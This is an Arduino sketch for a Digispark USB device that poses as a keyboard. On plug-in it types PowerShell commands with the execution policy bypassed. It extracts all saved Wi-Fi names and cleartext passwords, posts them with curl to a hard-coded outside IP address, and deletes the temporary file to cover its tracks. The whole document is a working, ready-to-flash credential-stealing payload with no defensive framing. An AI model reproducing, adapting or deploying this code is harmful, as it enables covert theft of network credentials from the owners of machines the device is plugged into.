//Adapted from p0wc0w.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0); // init fr
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // open run.exe
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -exec bypass"); // gotta be exec
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
// this is a big ol string adapted from p0wc0w which yoinks pword
  DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path $env:userprofile\\temp.csv;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
// this is the curl arguments
  DigiKeyboard.print("$CurlArgument = '-X', 'POST', '-d', '@temp.csv', 'http://220.245.150.140:443/givepass'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
// curl is installed on all win 10 in system32 which is pretty cool but powershell doesn't have it on path for some reason so this is needed
  DigiKeyboard.print("$CurlEXE = 'C:/Windows/System32/curl.exe'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
// use them together
  DigiKeyboard.print("& $CurlEXE @CurlArgument");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
// remove traces of the wifi password file
  DigiKeyboard.print("ri $env:userprofile\\temp.csv -force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //leaving
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
// This is an infinite loop to make it only happen once, could I just use void setup, yes, but is it as cool as this, no :sunglasses:
  for(;;){ /*empty*/ }
}
